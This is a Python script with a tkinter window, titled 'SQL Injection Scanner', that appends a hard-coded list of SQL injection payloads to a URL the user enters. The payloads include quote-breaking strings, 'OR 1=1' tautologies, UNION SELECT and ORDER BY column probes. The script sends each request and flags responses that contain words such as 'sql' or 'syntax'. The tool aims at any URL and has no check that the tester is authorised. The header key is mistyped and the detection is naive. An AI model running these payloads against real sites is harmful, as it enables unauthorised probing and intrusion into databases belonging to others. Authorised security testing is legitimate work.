import requests
import tkinter as tk
from tkinter import messagebox

# List of SQL injection payloads
payloads = [
    "'",
    "''",
    "`",
    "``",
    ",",
    '"',
    '""',
    "//",
    "\\",
    "\\\\",
    ";",
    "' or '",
    "--",
    "#",
    "' OR '1'='1",
    "' OR 1 -- -",
    '" OR "" = "',
    '" OR 1 = 1 -- -',
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "=0--+",
    " OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2",
    "%00",
    "/*…*/",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' ORDER BY 1,2--+",
    "1' ORDER BY 1,2,3--+"
]

def test_sql_injection(url):
    results = []
    for payload in payloads:
        # Construct the full URL with the payload
        test_url = f"{url}{payload}"
        try:
            # Send the request with a User-Agent header
            headers = {
                'User -Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
            response = requests.get(test_url, headers=headers)
            
            # Check for signs of SQL injection
            if response.status_code == 200:
                # Check for common SQL error messages or changes in response content
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    results.append(f"Potential SQL injection vulnerability found with payload: {payload}")
                elif "mysql" in response.text.lower() or "syntax" in response.text.lower():
                    results.append(f"Potential SQL injection vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            # Handle any request exceptions
            pass  # You can log the error if needed

    # Show results in a message box
    if results:
        messagebox.showinfo("Scan Results", "\n".join(results))
    else:
        messagebox.showinfo("Scan Results", "No vulnerabilities found.")

def start_scan():
    url = url_entry.get()
    if url:
        test_sql_injection(url)
    else:
        messagebox.showwarning("Input Error", "Please enter a valid URL.")

# Create the main window
root = tk.Tk()
root.title("SQL Injection Scanner")

# Create a simple label for the title
title_label = tk.Label(root, text="SQL Injection Scanner", font=("Arial", 16))
title_label.pack(pady=10)

# Create a label and entry for the URL
url_label = tk.Label(root, text="Enter the target URL:")
url_label.pack(pady=5)

url_entry = tk.Entry(root, width=50)
url_entry.pack(pady=5)

# Create a button to start the scan
scan_button = tk.Button(root, text="Start Scan", command=start_scan)
scan_button.pack(pady=20)

# Run the application
root.mainloop()
